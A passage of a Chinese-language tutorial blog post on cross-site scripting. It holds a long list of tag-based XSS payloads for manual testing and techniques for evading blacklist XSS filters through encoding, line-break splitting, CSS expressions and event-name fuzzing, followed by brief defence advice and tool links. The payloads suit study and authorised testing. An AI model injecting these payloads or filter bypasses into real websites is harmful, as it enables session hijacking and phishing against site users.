+<h4 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h4><p>&#160; &#160; &#160; &#160;首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如<code>&quot;&lt;&gt;&amp;;/&#39;:</code>等，如果连<code>&lt;&gt;</code>都未过滤/转义，那么该输入点很可能存在XSS漏洞。<br>&#160; &#160; &#160; &#160;如果<code>&lt;&gt;</code>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如<br><code>&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;</code>这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为<code>&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;</code>。<br>&#160; &#160; &#160; &#160;一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;标签</span><br><span class="line">利用方式1</span><br><span class="line">&lt;img src=javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr=&quot;URL&quot; style=&apos;Xss:expression(alert(/xss));&apos;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src=1 onmouseover=alert(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;a&gt;标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;&quot; onclick=alert(&apos;xss&apos;)&gt;aa&lt;/a&gt;</span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&apos;xss&apos;) y=2016&gt;aa&lt;/a&gt;</span><br><span class="line">input标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value=&quot;&quot; onclick=alert(&apos;xss&apos;) type=&quot;text&quot;&gt;</span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&apos;xss&apos;) bad=&quot;&quot;&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;form&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;form action=javascript:alert(&apos;xss&apos;) method=&quot;get&quot;&gt;</span><br><span class="line">&lt;form action=javascript:alert(&apos;xss&apos;)&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=prompt(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=alert(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;form action=1 onmouseover=alert(&apos;xss)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">&lt;iframe&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=5width=1000 /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&apos;xss&apos;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&apos;xss&apos;) /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">svg&lt;&gt;标签</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">iframe</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
+<p>——引自<strong>wkend</strong>的文章<a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">《XSS小节》</a></p>
+<h4 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h4><p>&#160; &#160; &#160; &#160;关于XSS的自动检测软件有许多，如Burp的Scan模块，<a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">BruteXSS</a>等，这里不做过多解释。</p>
+<h2 id="6-shellcode的绕过"><a href="#6-shellcode的绕过" class="headerlink" title="6) shellcode的绕过"></a>6) shellcode的绕过</h2><h3 id="绕过XSS-Filter"><a href="#绕过XSS-Filter" class="headerlink" title="绕过XSS-Filter"></a>绕过XSS-Filter</h3><p>&#160; &#160; &#160; &#160;XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。</p>
+<h4 id="空格回车和Tab"><a href="#空格回车和Tab" class="headerlink" title="空格回车和Tab"></a>空格回车和Tab</h4><p>&#160; &#160; &#160; &#160;对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将<code>;</code>作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到<code>;</code>便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字<code>javascript|alert</code>的过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javasc</span><br><span class="line">ript:aler</span><br><span class="line">t(/xss/)&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/03/10/5c83f56052a54.png" alt="IE6下测试成功"></p>
+<h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p>&#160; &#160; &#160; &#160;HTML中属性值支持ASCII码形式，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;替换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;其中在ASCII表中116为<code>t</code>，58为<code>:</code>。<br>&#160; &#160; &#160; &#160;也可以将<code>&amp;#01</code>,<code>&amp;#02</code>等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。</p>
+<h4 id="Fuzz标签未过滤事件名"><a href="#Fuzz标签未过滤事件名" class="headerlink" title="Fuzz标签未过滤事件名"></a>Fuzz标签未过滤事件名</h4><p>&#160; &#160; &#160; &#160;如<code>&lt;img src=x onerror=alert(/xss/)&gt;</code>其中的onerror即为IMG标签的一个事件，通常这样的事件都是以<code>on</code>开头，常见的有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onReverse</span><br><span class="line">onSeek</span><br><span class="line">onSynchRestored</span><br><span class="line">onURLFlip</span><br><span class="line">onRepeat</span><br><span class="line">onPause</span><br><span class="line">onstop</span><br><span class="line">onmouseover</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;除此之外还有很多事件可以利用，这里不再一一列举。</p>
+<h4 id="使用Css绕过"><a href="#使用Css绕过" class="headerlink" title="使用Css绕过"></a>使用Css绕过</h4><p>&#160; &#160; &#160; &#160;利用Css样式表可以执行javascript的特性，如<br>&#160; &#160; &#160; &#160;Css直接执行javascript：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;css中使用expression执行javascript:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;width: expression(alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:expression(&quot;alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。<br>&#160; &#160; &#160; &#160;除了上述两种，还可以利用@import直接执行javascript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    @import &apos;javascript:alert(&quot;xss&quot;)&apos;;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。</p>
+<h3 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h3><ul>
+<li>大小写变换;</li>
+<li>利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;</li>
+<li>结合样式表注释字符/**/，通过css执行javascript</li>
+<li>样式标签会过滤<code>\</code>和<code>\0</code>，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过</li>
+<li>Css关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分</li>
+<li>利用浏览器解析注释的问题</li>
+</ul>
+<h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>&#160; &#160; &#160; &#160;javascript支持许多的编码格式，如：</p>
+<ul>
+<li>unicode</li>
+<li>escapes</li>
+<li>十六|十|八进制  </li>
+</ul>
+<p><strong>如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力</strong><br>在IE下甚至支持JScript Encode加密后的代码</p>
+<h3 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h3><p>&#160; &#160; &#160; &#160;如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：<a href="http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm" target="_blank" rel="noopener">《疯狂的跨站之行》剑心(非原链接)</a></p>
+<h2 id="7-XSS防御"><a href="#7-XSS防御" class="headerlink" title="7) XSS防御"></a>7) XSS防御</h2><p>&#160; &#160; &#160; &#160;说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？</p>
+<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>&#160; &#160; &#160; &#160;严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p>
+<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>&#160; &#160; &#160; &#160;减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>&#160; &#160; &#160; &#160;设置HttpOnly，开启WAF。</p>
+<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>&#160; &#160; &#160; &#160;感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(<a href="http://www.0x002.com)。">www.0x002.com)。</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong><br>书籍：<br>《Web前端黑客技术揭秘》<br>《XSS跨站脚本攻击剖析与防御》<br>《白帽子讲Web安全》<br>《黑客攻防技术宝典Web实战篇》第二版<br>文章：</strong><br><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://github.com/dwqs/blog/issues/68" target="_blank" rel="noopener">浅说 XSS 和 CSRF</a><br><a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">Session攻击手段(会话劫持/固定)及其安全防御措施</a>  </p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md" target="_blank" rel="noopener">https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md</a>  2017灰袍技能精华<br><a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">https://github.com/rajeshmajumdar/BruteXSS</a> BruteXSS<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a> Beef神器<br><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> 用于检查跨站点跟踪的小型python脚本<br><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> 一个非常简单的反射XSS扫描仪支持GET/POST<br><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> 反射xss扫描器<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 浏览器的插件，它自动检查页面是否具有xss和漏洞<br><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> xss命令行工具用于测试web应用程序中xss负载列表<br><a href="https://github.com/UltimateHackers/XSStrike" target="_blank" rel="noopener">https://github.com/UltimateHackers/XSStrike</a> 用于XSS、WAF检测和旁路的模糊和蛮力参数<br><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
+          
+            <a href="/tags/web安全/" rel="tag"><i class="fa fa-tag"></i> web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/PHP反序列漏洞的简单学习/" rel="next" title="PHP反序列化漏洞的简单学习">
+                <i class="fa fa-chevron-left"></i> PHP反序列化漏洞的简单学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/使用Django打造属于自己的XSS平台/" rel="prev" title="使用Django简单编写一个XSS平台">
+                使用Django简单编写一个XSS平台 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://q4.qlogo.cn/headimg_dl?dst_uin=2865859175&spec=100"
+                alt="Yunen" />
+            
+              <p class="site-author-name" itemprop="name">Yunen</p>
+              <p class="site-description motion-element" itemprop="description">Just A Websafe Lover!</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/HackerYunen" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="2865859175@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/yunen/" title="Yunen's cnblog" target="_blank">Yunen's cnblog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.safe6.cn/" title="Safe6's Blog" target="_blank">Safe6's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lolpzili.com/" title="Lolpzili's Blog" target="_blank">Lolpzili's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.endereyewxy.com/" title="Endereye's Blog" target="_blank">Endereye's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hackerdelort.com/" title="Delort's Blog" target="_blank">Delort's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.aisnnu.com/" title="Aisnnu's Blog" target="_blank">Aisnnu's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xhyeax.github.io/" title="Xhy's Blog" target="_blank">Xhy's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简单概述"><span class="nav-number">1.</span> <span class="nav-text">简单概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-什么是XSS"><span class="nav-number">1.1.</span> <span class="nav-text">1) 什么是XSS?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-XSS可以带来哪些危害？"><span class="nav-number">1.2.</span> <span class="nav-text">2) XSS可以带来哪些危害？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-XSS类型"><span class="nav-number">1.3.</span> <span class="nav-text">3) XSS类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型XSS"><span class="nav-number">1.3.1.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型XSS"><span class="nav-number">1.3.2.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM型XSS"><span class="nav-number">1.3.3.</span> <span class="nav-text">DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-XSS的利用方式"><span class="nav-number">1.4.</span> <span class="nav-text">4) XSS的利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie窃取"><span class="nav-number">1.4.1.</span> <span class="nav-text">Cookie窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#默认"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">默认</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不同域"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">不同域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不同路径"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">不同路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Http-Only"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">Http Only</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Secure"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">Secure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#P3P"><span class="nav-number">1.4.1.6.</span> <span class="nav-text">P3P</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#B域设置A域Cookie"><span class="nav-number">1.4.1.6.1.</span> <span class="nav-text">B域设置A域Cookie</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#加载B域时Cookie传入问题"><span class="nav-number">1.4.1.6.2.</span> <span class="nav-text">加载B域时Cookie传入问题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话劫持"><span class="nav-number">1.4.2.</span> <span class="nav-text">会话劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#钓鱼"><span class="nav-number">1.4.3.</span> <span class="nav-text">钓鱼</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS重定向钓鱼"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">XSS重定向钓鱼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTML注入式钓鱼"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">HTML注入式钓鱼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Iframe"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">Iframe</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-XSS漏洞的挖掘"><span class="nav-number">1.5.</span> <span class="nav-text">5) XSS漏洞的挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#白盒审计"><span class="nav-number">1.5.1.</span> <span class="nav-text">白盒审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑盒审计"><span class="nav-number">1.5.2.</span> <span class="nav-text">黑盒审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手工检测"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">手工检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#工具检测"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">工具检测</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-shellcode的绕过"><span class="nav-number">1.6.</span> <span class="nav-text">6) shellcode的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过XSS-Filter"><span class="nav-number">1.6.1.</span> <span class="nav-text">绕过XSS-Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#空格回车和Tab"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">空格回车和Tab</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#对标签属性值进行转码"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">对标签属性值进行转码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fuzz标签未过滤事件名"><span class="nav-number">1.6.1.3.</span> <span class="nav-text">Fuzz标签未过滤事件名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用Css绕过"><span 